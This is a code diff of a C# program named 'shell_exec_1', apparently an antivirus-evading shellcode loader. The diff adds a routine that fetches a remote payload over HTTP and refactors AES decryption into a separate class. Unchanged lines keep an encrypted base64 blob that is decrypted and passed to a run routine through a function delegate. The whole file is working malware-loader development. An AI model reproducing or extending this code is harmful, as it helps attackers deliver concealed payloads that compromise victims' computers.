@@ -1,31 +1,29 @@
 ﻿using System;
-using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 using System.IO;
-
+using System.Net;
 
 namespace shell_exec_1
 {
     class Program
     {
+        /* CLASS GLOBALS */
         private delegate Int32 Run();
+        public const string strPassword = "";
 
 
-        public static class Global
-        {
-            // set password
-            public const string strPassword = "testtesttest";
-
-            // set permutations
-            public const String strPermutation = "ouiveyxaqtd";
-            public const Int32 bytePermutation1 = 0x19;
-            public const Int32 bytePermutation2 = 0x59;
-            public const Int32 bytePermutation3 = 0x17;
-            public const Int32 bytePermutation4 = 0x41;
-        }
 
         static void Main(string[] args)
         {
+
+            String payload_uri = @"http://127.0.0.1/payload.txt";
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(payload_uri);
+            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+            StreamReader r_data = new StreamReader(response.GetResponseStream());
+            String data = r_data.ReadToEnd();
+            response.Close();
+            Console.WriteLine(data);
+            Environment.Exit(0);
 
             /*
             Console.WriteLine("UNENCRYPTED:");
@@ -55,7 +53,7 @@ namespace shell_exec_1
 
             //--------------- B64 stuff
             String pretty = "ei2qy0sTra8eNbEL7vh6a6SuqTzrvGXraJAMmQfyYXba0l2OtHf4Tx9ihK1PxsdE5b0777BOwCA1mjD/Juzs+FajEebm6tseHjn3bGgimwDzdEGxVrbuYp9oamt9viGlLJEwOaXkh8UxTi3KnNMLzI2URiyHkEA7Kb9OP7k29FkLXBXOKu4itGewSSp/qTuzXvgmCOScgRfw/kulLjKN19B4M9r4Lf3FdNkW+3jvjuE5sCzm9KjuXtfi+5bdrnIL5hqk2ZGHhcee3zdsUSt4J1UCS8MW8TomNAaYxklNIluSa3AK5+utLyhICUBR0mnkTvve90733Dk2sWyo+L6RQBCtQiQjjIRT5akCpdZc3DvVyV6XamgDK8Go+0SgEcF3OXyaLYOb/3+x0DSu3JRNsugWEH2Sp/uPHgTpG9zucGIN5RlRUtBEHKkhG27C+GvOSbemVloICUTGx9GONfcFxGkacS8mTvZoOKPr5/DglMKqLxc2iqRASqZeY8TQfsr2HPjuFKFSCiaahN3MC4Hd1goCS65OC22aW3fqzNJcg2aCYgPERE6L6PKrEcRV18lwa0hAdAbDuo+nnp0Bg9Mq/h2rtpM+t2gnfJNb7Pnr7/Pr2NQlx2icdvWXT/gDn8GRSLLOeJ8Hf4kfHjcyDDlF7znKId4kuCtl8NNEo4swom+vMjzkA0Bgt+p77sR/P4ZzP8ybebX8PmE9gRZFCzjLPQ==";
-            Byte[] de_pretty = Decrypt(Convert.FromBase64String(pretty));
+            Byte[] de_pretty = mrCrypto.Decrypt(Convert.FromBase64String(pretty));
 
 
             bool test1 = hiphop(de_pretty);
@@ -121,51 +119,7 @@ namespace shell_exec_1
           UInt32 dwMilliseconds
         );
 
-        // encrypt
-        public static byte[] Encrypt(byte[] strData)
-        {
-            PasswordDeriveBytes passbytes =
-            new PasswordDeriveBytes(Global.strPermutation,
-            new byte[] { Global.bytePermutation1,
-                         Global.bytePermutation2,
-                         Global.bytePermutation3,
-                         Global.bytePermutation4
-            });
 
-            MemoryStream memstream = new MemoryStream();
-            Aes aes = new AesManaged();
-            aes.Key = passbytes.GetBytes(aes.KeySize / 8);
-            aes.IV = passbytes.GetBytes(aes.BlockSize / 8);
-
-            CryptoStream cryptostream = new CryptoStream(memstream,
-            aes.CreateEncryptor(), CryptoStreamMode.Write);
-            cryptostream.Write(strData, 0, strData.Length);
-            cryptostream.Close();
-            return memstream.ToArray();
-        }
-
-        // decrypt
-        public static byte[] Decrypt(byte[] strData)
-        {
-            PasswordDeriveBytes passbytes =
-            new PasswordDeriveBytes(Global.strPermutation,
-            new byte[] { Global.bytePermutation1,
-                         Global.bytePermutation2,
-                         Global.bytePermutation3,
-                         Global.bytePermutation4
-            });
-
-            MemoryStream memstream = new MemoryStream();
-            Aes aes = new AesManaged();
-            aes.Key = passbytes.GetBytes(aes.KeySize / 8);
-            aes.IV = passbytes.GetBytes(aes.BlockSize / 8);
-
-            CryptoStream cryptostream = new CryptoStream(memstream,
-            aes.CreateDecryptor(), CryptoStreamMode.Write);
-            cryptostream.Write(strData, 0, strData.Length);
-            cryptostream.Close();
-            return memstream.ToArray();
-        }
 
         public static bool ByteArrayToFile(string fileName, byte[] byteArray)
         {
